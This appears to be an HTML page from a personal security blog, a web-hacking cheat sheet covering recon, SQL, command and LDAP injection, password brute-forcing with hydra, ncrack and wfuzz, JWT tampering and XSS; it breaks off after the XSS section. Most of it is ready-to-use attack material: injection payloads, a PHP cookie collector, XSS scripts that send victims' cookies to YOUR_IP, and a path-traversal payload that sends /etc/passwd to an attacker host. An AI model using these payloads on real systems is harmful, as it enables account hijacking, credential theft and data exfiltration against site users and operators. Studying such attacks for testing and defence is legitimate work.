@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>🌐 Web Vulnerabilities | Conper</title>
+<meta name="keywords" content="">
+<meta name="description" content="Identifying and exploiting security flaws in web applications, such as SQL injection, XSS, file inclusion, SSTI, SSRF, and other web-based attacks.">
+<meta name="author" content="">
+<link rel="canonical" href="https://conper.xyz/cybersecurity/hacking/webvulns/">
+<link crossorigin="anonymous" href="https://conper.xyz/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://conper.xyz/assets/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://conper.xyz/assets/favicon.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="https://conper.xyz/assets/favicon.ico">
+<link rel="apple-touch-icon" href="https://conper.xyz/apple-touch-icon.png">
+<link rel="mask-icon" href="https://conper.xyz/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="https://conper.xyz/cybersecurity/hacking/webvulns/index.xml">
+<link rel="alternate" hreflang="en" href="https://conper.xyz/cybersecurity/hacking/webvulns/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://conper.xyz/cybersecurity/hacking/webvulns/">
+  <meta property="og:site_name" content="Conper">
+  <meta property="og:title" content="🌐 Web Vulnerabilities">
+  <meta property="og:description" content="Identifying and exploiting security flaws in web applications, such as SQL injection, XSS, file inclusion, SSTI, SSRF, and other web-based attacks.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="🌐 Web Vulnerabilities">
+<meta name="twitter:description" content="">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Cybersecurity",
+      "item": "https://conper.xyz/cybersecurity/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Hacking",
+      "item": "https://conper.xyz/cybersecurity/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "🌐 Web Vulnerabilities",
+      "item": "https://conper.xyz/cybersecurity/hacking/webvulns/"
+    }
+  ]
+}
+</script>
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://conper.xyz/" accesskey="h" title="Conper (Alt + H)">Conper</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://conper.xyz/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://conper.xyz/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://conper.xyz/projects/" title="My Projects">
+                    <span>My Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://conper.xyz/cybersecurity/" title="Cybersecurity">
+                    <span>Cybersecurity</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://conper.xyz/it/" title="IT">
+                    <span>IT</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://conper.xyz/about/" title="About Me">
+                    <span>About Me</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://conper.xyz/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header">
+  <h1>
+    🌐 Web Vulnerabilities
+  </h1>
+</header>
+<div class="post-content"><style>
+    img {
+        transition: transform 0.3s ease;
+    }
+    img:hover {
+        transform: scale(1.05);
+    }
+</style>
+<h2 id="table-of-contents">Table of Contents<a hidden class="anchor" aria-hidden="true" href="#table-of-contents">#</a></h2>
+<div style="background-color: rgba(255, 255, 255, 0.1); padding:10px; border-radius:8px;">
+<details>
+  <summary>🔍 Information Gathering</summary>
+<ul>
+<li><a href="#google-dorking">Google Dorking</a></li>
+<li><a href="#wappalyzer">Wappalyzer</a></li>
+<li><a href="#whatweb">WhatWeb</a></li>
+<li><a href="#burp-suite-passive-scan">Burp Suite Passive Scan</a></li>
+</ul>
+</details>
+<details>
+  <summary>💉 Injection Vulnerabilities</summary>
+<ul>
+<li><a href="#sql-injection-sqli">SQL Injection (SQLi)</a></li>
+<li><a href="#command-injection">Command Injection</a></li>
+<li><a href="#ldap-injection">LDAP Injection</a></li>
+</ul>
+</details>
+<details>
+  <summary>🔐 Authentication & Session Issues</summary>
+<ul>
+<li><a href="#weak-password-policies">Weak password policies</a></li>
+<li><a href="#brute-force--credential-stuffing">Brute force / Credential stuffing</a></li>
+<li><a href="#session-fixation">Session fixation</a></li>
+<li><a href="#jwt-manipulation">JWT manipulation</a></li>
+<li><a href="#cookie-stealing-via-xss">Cookie stealing via XSS</a></li>
+</ul>
+</details>
+<details>
+  <summary>💻 Cross-Site Scripting (XSS)</summary>
+<ul>
+<li><a href="#reflected-xss">Reflected XSS</a></li>
+<li><a href="#stored-xss">Stored XSS</a></li>
+<li><a href="#dom-based-xss">DOM-based XSS</a></li>
+<li><a href="#xss-payloads">XSS Payloads</a></li>
+</ul>
+</details>
+<details>
+  <summary>🎯 Cross-Site Request Forgery (CSRF)</summary>
+<ul>
+<li><a href="#how-csrf">How CSRF</a></li>
+<li><a href="#csrf-example">CSRF Example</a></li>
+</ul>
+</details>
+<details>
+  <summary>📂 File Upload Vulnerabilities</summary>
+<ul>
+<li><a href="#unrestricted-file-upload">Unrestricted file upload</a></li>
+<li><a href="#file-extension-bypass">File extension bypass</a></li>
+<li><a href="#content-type-spoofing">Content-type spoofing</a></li>
+</ul>
+</details>
+<details>
+  <summary>🛡 Path & File Disclosure</summary>
+<ul>
+<li><a href="#local-file-inclusion-lfi">Local File Inclusion (LFI)</a></li>
+<li><a href="#remote-file-inclusion-rfi">Remote File Inclusion (RFI)</a></li>
+<li><a href="#path-traversal">Path traversal</a></li>
+</ul>
+</details>
+<details>
+  <summary>🔑 Access Control Issues</summary>
+<ul>
+<li><a href="#idor-insecure-direct-object-references">IDOR (Insecure Direct Object References)</a></li>
+<li><a href="#bypassing-authorization-checks">Bypassing authorization checks</a></li>
+</ul>
+</details>
+<details>
+  <summary>⚙️ Server-Side Issues</summary>
+<ul>
+<li><a href="#ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery)</a></li>
+<li><a href="#ssti-server-side-template-injection">SSTI (Server-Side Template Injection)</a></li>
+<li><a href="#log-poisoning">Log Poisoning</a></li>
+</ul>
+</details>
+</div>
+<h2 id="-information-gathering">🔍 Information Gathering<a hidden class="anchor" aria-hidden="true" href="#-information-gathering">#</a></h2>
+<p>Techniques and tools to gather information about a target web application before attempting exploitation.</p>
+<h3 id="google-dorking">Google Dorking<a hidden class="anchor" aria-hidden="true" href="#google-dorking">#</a></h3>
+<p>Use advanced Google search operators to discover sensitive files, admin panels, or exposed information.</p>
+<p>Examples:</p>
+<pre tabindex="0"><code>site:example.com inurl:admin
+site:example.com filetype:pdf
+site:example.com intitle:&#34;index of&#34;
+</code></pre><p>Build and test advanced Google dorks easily with <a href="https://dorksearch.com/"><strong>DorkSearch</strong></a></p>
+<h3 id="wappalyzer">Wappalyzer<a hidden class="anchor" aria-hidden="true" href="#wappalyzer">#</a></h3>
+<p>Browser extension or CLI tool to identify technologies used by the target (CMS, frameworks, libraries, etc.).</p>
+<div style="display: flex; justify-content: center;">
+  <img src="https://conper.xyz/images/hacking/wappalyzer.jpg" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
+</div>
+<p>CLI example:</p>
+<pre tabindex="0"><code>wappalyzer https://example.com
+</code></pre><p>You can also perform this directly in your browser.</p>
+<p><a href="https://www.wappalyzer.com/apps/">Wappalyzer</a></p>
+<h3 id="whatweb">WhatWeb<a hidden class="anchor" aria-hidden="true" href="#whatweb">#</a></h3>
+<p>CLI tool to fingerprint websites and detect technologies, plugins, and server information.</p>
+<pre tabindex="0"><code>whatweb https://example.com
+whatweb -v https://example.com
+</code></pre><h3 id="burp-suite-passive-scan">Burp Suite Passive Scan<a hidden class="anchor" aria-hidden="true" href="#burp-suite-passive-scan">#</a></h3>
+<div style="display: flex; justify-content: center;">
+  <img src="https://conper.xyz/images/hacking/burpsuite.png" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
+</div>
+<p>Run the target through Burp Proxy and let the passive scanner detect headers, cookies, and vulnerabilities without sending intrusive requests.</p>
+<ul>
+<li>Look for:
+<ul>
+<li>Missing security headers</li>
+<li>Outdated components</li>
+<li>Insecure cookies</li>
+</ul>
+</li>
+</ul>
+<h3 id="robotstxt--sitemapxml-review">robots.txt / sitemap.xml Review<a hidden class="anchor" aria-hidden="true" href="#robotstxt--sitemapxml-review">#</a></h3>
+<div style="display: flex; justify-content: center;">
+  <img src="https://conper.xyz/images/hacking/robotstxt.png" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
+</div>
+<p>You can anually check <em><strong><a href="https://target.com/robots.txt">https://target.com/robots.txt</a></strong></em> and <em><strong><a href="https://target.com/sitemap.xml">https://target.com/sitemap.xml</a></strong></em> for disallowed or hidden paths.</p>
+<hr>
+<h2 id="-injection-vulnerabilities">🪲 Injection Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#-injection-vulnerabilities">#</a></h2>
+<h3 id="sql-injection-sqli">SQL Injection (SQLi)<a hidden class="anchor" aria-hidden="true" href="#sql-injection-sqli">#</a></h3>
+<p>SQL Injection is a vulnerability that allows an attacker to manipulate backend database queries by injecting malicious SQL code through user input.</p>
+<div style="display: flex; justify-content: center;">
+  <img src="https://conper.xyz/images/hacking/sqli.png" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
+</div>
+<p><strong>Types of SQLi</strong></p>
+<ul>
+<li>
+<p><strong>Error-based</strong>: Uses error messages from the database to get information.</p>
+</li>
+<li>
+<p><strong>Union-based</strong>: Combines real and fake data to see hidden info.</p>
+</li>
+<li>
+<p><strong>Blind (Boolean-based)</strong>: Asks yes or no questions to figure out data.</p>
+</li>
+<li>
+<p><strong>Blind (Time-based)</strong>: Checks if the database takes longer to respond to learn information.</p>
+</li>
+</ul>
+<p><strong>Detection</strong></p>
+<ul>
+<li>Manual testing by injecting <code>' OR '1'='1</code>, <code>' or 1=1-- -</code> or similar payloads in input fields.</li>
+<li>Using tools to automate detection and exploitation.</li>
+</ul>
+<p><strong>Tools</strong></p>
+<ul>
+<li><strong>SQLMap</strong>: Automated tool for detecting and exploiting SQLi.</li>
+<li><strong>Burp Suite</strong>: Manual testing and payload injection.</li>
+</ul>
+<p><strong>Basic SQLMap usage</strong></p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://target.com/vuln.php?id=1&#34; --batch --dbs
+</code></pre><p>This command tests the URL parameter for SQLI and enumerates databases if vulnerable.</p>
+<p>Or you can save the HTTP request from Burp Suite into a file and use it with sqlmap like this:</p>
+<pre tabindex="0"><code>sqlmap -r sql.txt --batch --dbs
+</code></pre><p><strong>Example manual payloads:</strong></p>
+<pre tabindex="0"><code>&#39; OR 1=1--
+&#39; UNION SELECT NULL,NULL--
+&#39; AND (SELECT SUBSTRING(user(),1,1))=&#39;a&#39;--
+</code></pre><blockquote>
+<p><strong>Tip:</strong> Find out the database type (MySQL, MSSQL, Oracle) to use the right commands.</p></blockquote>
+<h3 id="command-injection">Command Injection<a hidden class="anchor" aria-hidden="true" href="#command-injection">#</a></h3>
+<div style="display: flex; justify-content: center;">
+  <img src="https://conper.xyz/images/hacking/commandinjection.png" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
+</div>
+<p>Occurs when user input is run as system commands without proper checks, letting attackers execute arbitrary commands on the server.</p>
+<p><strong>How to test?</strong></p>
+<p>Inject characters like <code>;</code>, <code>|</code>, or <code>&amp;&amp;</code> followed by commands (<code>ls</code>, <code>whoami</code>) into input fields or URLs.</p>
+<p><strong>Common payloads</strong></p>
+<pre tabindex="0"><code>; ls
+| whoami
+&amp;&amp; id
+</code></pre><p><strong>Tools</strong></p>
+<ul>
+<li><a href="https://github.com/commixproject/commix"><strong>Commix</strong></a> for automated exploitation</li>
+</ul>
+<p>How to use Commix with examples <a href="https://github.com/commixproject/commix/wiki/Usage-Examples"><strong>here</strong></a></p>
+<blockquote>
+<p><strong>Tip:</strong> Always validate and sanitize inputs to stop command injection.</p></blockquote>
+<h3 id="ldap-injection">LDAP Injection<a hidden class="anchor" aria-hidden="true" href="#ldap-injection">#</a></h3>
+<p>Happens when user input is placed directly in an LDAP query without sanitization, allowing attackers to modify the query to bypass login or access hidden data.</p>
+<div style="display: flex; justify-content: center;">
+  <img src="https://conper.xyz/images/hacking/LDAPinjection.png" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
+</div>
+<p>Example payloads:</p>
+<pre tabindex="0"><code>*)(uid=*))(|(uid=*
+admin)(&amp;)
+*)(|(uid=admin))
+admin*
+</code></pre><p><strong>Bypass authentication:</strong></p>
+<p>If the app builds this query:</p>
+<pre tabindex="0"><code>(&amp;(uid=USER)(userPassword=PASS))
+</code></pre><p>and you enter as username:</p>
+<pre tabindex="0"><code>*)(|(uid=*))
+</code></pre><p>It becomes:</p>
+<pre tabindex="0"><code>(&amp;(uid=*)(|(uid=*))(userPassword=PASS))
+</code></pre><p>The <strong>(|(uid=*))</strong> part matches any user, so the filter is always true and you log in without the real password.</p>
+<hr>
+<h2 id="-authentication--session-issues">🔑 Authentication &amp; Session Issues<a hidden class="anchor" aria-hidden="true" href="#-authentication--session-issues">#</a></h2>
+<p>These issues show up when login or session management isn’t handled properly. In simple terms, any flaw that lets an attacker impersonate another user or access data they shouldn’t is in this category.</p>
+<h3 id="weak-password-policies">Weak password policies<a hidden class="anchor" aria-hidden="true" href="#weak-password-policies">#</a></h3>
+<p>If a site allows really simple, short, or common passwords, it’s an easy target. You can spot this when accounts have passwords like 123456 or password. To test it, tools like hydra are perfect:</p>
+<pre tabindex="0"><code>hydra -l admin -P passwords.txt target.com http-post-form &#34;/login:username=^USER^&amp;password=^PASS^:F=Incorrect&#34;
+</code></pre><h3 id="brute-force--credential-stuffing">Brute force / Credential stuffing<a hidden class="anchor" aria-hidden="true" href="#brute-force--credential-stuffing">#</a></h3>
+<p>This is when attackers <strong>try lots of passwords</strong> or <strong>reused credentials</strong> from leaks. You can usually spot it <strong>if the site doesn’t limit login attempts</strong> or lock accounts.</p>
+<p>Example with <strong>ncrack</strong>:</p>
+<pre tabindex="0"><code>ncrack -u admin -P common-passwords.txt target.com:22
+</code></pre><blockquote>
+<p>📝 <strong>NOTE</strong>: <strong>Ncrack</strong> is used for efficient and <strong>safe brute-forcing</strong> of <strong>network services</strong> (SSH, RDP, FTP, etc.) and is more stable, while Hydra supports more protocols but can overload or crash services.</p></blockquote>
+<p>Example using <strong>wfuzz</strong> on a <strong>web login form</strong>:</p>
+<pre tabindex="0"><code>wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 401 http://target.com/login -d &#34;username=admin&amp;password=FUZZ&#34;
+</code></pre><h3 id="session-fixation">Session fixation<a hidden class="anchor" aria-hidden="true" href="#session-fixation">#</a></h3>
+<p>Here, the attacker forces a <strong>known session ID</strong> and waits for the user to log in. If the site doesn’t change the <strong>session ID</strong> after login, the attacker can <strong>hijack</strong> it.</p>
+<p>Example HTTP request:</p>
+<pre tabindex="0"><code>GET /login HTTP/1.1
+Host: target.com
+Cookie: sessionid=KNOWNSESSIONID
+</code></pre><h3 id="jwt-manipulation">JWT manipulation<a hidden class="anchor" aria-hidden="true" href="#jwt-manipulation">#</a></h3>
+<div style="display: flex; justify-content: center;">
+  <img src="https://conper.xyz/images/hacking/JWTstructure.png" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
+</div>
+<p><strong>JSON Web Tokens</strong> can be <strong>manipulated</strong> to escalate privileges. This works if the server doesn’t properly verify the signature or allows <code>alg: none</code>.</p>
+<p>Decode and inspect a token:</p>
+<pre tabindex="0"><code>echo &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&#34; | jwt-decode
+</code></pre><p>Or go to <a href="https://www.jwt.io/"><strong>jwt.io</strong></a></p>
+<p>Then try <strong>changing roles</strong> or <strong>switching the algorithm</strong> and replay the token to see if you gain access.</p>
+<h3 id="cookie-stealing-via-xss">Cookie stealing via XSS<a hidden class="anchor" aria-hidden="true" href="#cookie-stealing-via-xss">#</a></h3>
+<p>If a site has a <strong>Cross-Site Scripting</strong> (<strong>XSS</strong>) vulnerability, you can <strong>inject JavaScript</strong> that runs in another user’s browser. If cookies aren’t marked as <strong>HttpOnly</strong>, this script can read them and send them to you.</p>
+<p>You can test it in:</p>
+<ul>
+<li>Input fields (search boxes, comment forms, profile updates)</li>
+<li>URL parameters (For example: ?q=&hellip;)</li>
+<li>Any place where user input is reflected in the page or stored for others</li>
+</ul>
+<p><strong>How to test step by step:</strong></p>
+<p>First, confirm <strong>XSS</strong> exists. A simple payload:</p>
+<pre tabindex="0"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>If you see the alert pop up in your browser, <strong>XSS</strong> is possible.</p>
+<p><strong>Set up a server to receive cookies:</strong></p>
+<p>You need a server that you control to collect the cookies sent by the victim&rsquo;s browser. For example, using PHP:</p>
+<pre tabindex="0"><code>&lt;?php
+
+if(isset($_GET[&#39;cookie&#39;])){
+    file_put_contents(&#39;cookies.txt&#39;, $_GET[&#39;cookie&#39;] . &#34;\n&#34;, FILE_APPEND);
+}
+?&gt;
+</code></pre><p><strong>Inject the cookie-stealing payload:</strong></p>
+<p>The JavaScript points to your server:</p>
+<pre tabindex="0"><code>&lt;script&gt;
+fetch(&#39;http://YOUR_IP/receive.php?cookie=&#39; + document.cookie);
+&lt;/script&gt;
+</code></pre><p><strong>XSS scripts</strong> run in the victim’s browser and can read cookies not marked <strong>HttpOnly</strong>.
+These cookies are then <strong>sent to a server you control</strong> via JavaScript.
+The victim’s browser acts as the messenger, automatically delivering the cookies when the payload is triggered.</p>
+<hr>
+<h2 id="-cross-site-scripting-xss">🎭 Cross-Site Scripting (XSS)<a hidden class="anchor" aria-hidden="true" href="#-cross-site-scripting-xss">#</a></h2>
+<p><strong>XSS</strong> happens when a website displays user input without proper filtering, <strong>allowing JavaScript</strong> to run in another user’s browser. This can steal cookies, manipulate the page, or even deliver malware.</p>
+<h3 id="reflected-xss">Reflected XSS<a hidden class="anchor" aria-hidden="true" href="#reflected-xss">#</a></h3>
+<p>The payload travels in the URL or form parameters and <strong>is reflected immediately</strong> in the response.</p>
+<p>You can <strong>test XSS</strong> in places <strong>where user input is reflected</strong> back on the page. This includes <strong>GET parameters</strong> like <code>?q=...</code>, as well as search boxes, login forms, or any input fields that <strong>display what the user typed</strong>.</p>
+<p>Test it by injecting a simple payload:</p>
+<pre tabindex="0"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>If an alert popup appears, the site is vulnerable to XSS.</p>
+<p>Example using a URL:</p>
+<pre tabindex="0"><code>http://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><h3 id="stored-xss">Stored XSS<a hidden class="anchor" aria-hidden="true" href="#stored-xss">#</a></h3>
+<p><strong>Stored XSS</strong> happens when you submit something (like a comment or profile bio) and the site saves it without filtering. Later, anyone who views that page runs your code in their browser automatically. It’s like leaving a hidden trap that triggers for anyone who looks. Unlike reflected XSS, the attack persists.</p>
+<p><strong>1. Create a server to receive data</strong></p>
+<p>You need a simple <strong>PHP endpoint</strong> that <strong>logs cookies</strong> sent by the <strong>victim</strong>:</p>
+<pre tabindex="0"><code>&lt;?php
+
+if(isset($_GET[&#39;cookie&#39;])){
+    file_put_contents(&#39;cookies.txt&#39;, $_GET[&#39;cookie&#39;] . &#34;\n&#34;, FILE_APPEND);
+}
+?&gt;
+</code></pre><p><strong>2. Craft the XSS payload</strong></p>
+<p>In the vulnerable field, inject:</p>
+<pre tabindex="0"><code>&lt;script&gt;
+fetch(&#39;http://YOUR_IP.com/receive.php?cookie=&#39;+document.cookie)
+&lt;/script&gt;
+</code></pre><p>When another user visits the page, their browser automatically <strong>sends their cookies</strong> to your server.</p>
+<p><strong>3. Verify it works</strong></p>
+<p>Open the page in another browser or incognito session and check <strong>cookies.txt</strong> on your server where you should see the <strong>victim’s cookies</strong> logged</p>
+<h3 id="dom-based-xss">DOM-based XSS<a hidden class="anchor" aria-hidden="true" href="#dom-based-xss">#</a></h3>
+<p>This happens when a website’s JavaScript takes something from the page URL or other browser data and shows it on the page without checking it. Your script runs in the browser, and the server never sees it.</p>
+<p>Where to test:</p>
+<ul>
+<li>
+<p>URL parts after # (like page#payload)</p>
+</li>
+<li>
+<p>URL parameters (?q=payload)</p>
+</li>
+<li>
+<p>Any place the page uses innerHTML or document.write()</p>
+</li>
+</ul>
+<p>Example test:</p>
+<pre tabindex="0"><code>http://example.com/page#&lt;script&gt;alert(&#39;DOM XSS&#39;)&lt;/script&gt;
+</code></pre><p><strong>Create a payload</strong></p>
+<p>Simple alert:</p>
+<pre tabindex="0"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>Steal cookies:</p>
+<pre tabindex="0"><code>&lt;script&gt;fetch(&#39;http://YOUR_IP/receive.php?c=&#39;+document.cookie)&lt;/script&gt;
+</code></pre><p>Load external JS:</p>
+<pre tabindex="0"><code>&lt;script src=&#34;http://YOUR_IP/malicious.js&#34;&gt;&lt;/script&gt;
+</code></pre><p><strong>Inject and test</strong></p>
+<p>Add it to the URL or hash:</p>
+<pre tabindex="0"><code>http://example.com/page#&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><blockquote>
+<p>📝 <strong>IMPORTANT</strong>: <strong>DOM XSS</strong> happens <strong>only in the browser</strong>, so check how the page shows data, not what the server returns.</p></blockquote>
+<h3 id="xss-payloads">XSS PAYLOADS<a hidden class="anchor" aria-hidden="true" href="#xss-payloads">#</a></h3>
+<p><strong>Read or exfiltrate /etc/passwd</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// Display file content directly in the browser
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() { <span style="color:#a6e22e">document</span><span style="color:#f92672">.</span><span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">responseText</span>); };
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span><span style="color:#f92672">.</span><span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;file:///etc/passwd&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span><span style="color:#f92672">.</span><span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Fetch file from vulnerable server and send to attacker
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://example.com/messages.php?file=../../../../../../../../../etc/passwd&#34;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">.</span><span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">r</span><span style="color:#f92672">.</span><span style="color:#a6e22e">text</span>())
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">.</span><span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://YOUR_IP:PORT/receive.php?file_content=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">encodeURIComponent</span>(<span style="color:#a6e22e">data</span>));  
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>PHP script to save the data (<strong>receive.php</strong>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;file_content&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;passwd_dump.txt&#39;</span>, $_GET[<span style="color:#e6db74">&#39;file_content&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">FILE_APPEND</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>
+<p>First payload tries to read <em><strong>/etc/passwd</strong></em> from the victim&rsquo;s machine.</p>
+</li>
+<li>
+<p>Second payload reads <em><strong>/etc/passwd</strong></em> from a vulnerable server and sends it to us.</p>
+</li>
+</ul>
+<p>You can find more payloads <a href="https://github.com/payloadbox/xss-payload-list"><strong>here</strong></a></p>
+<hr>
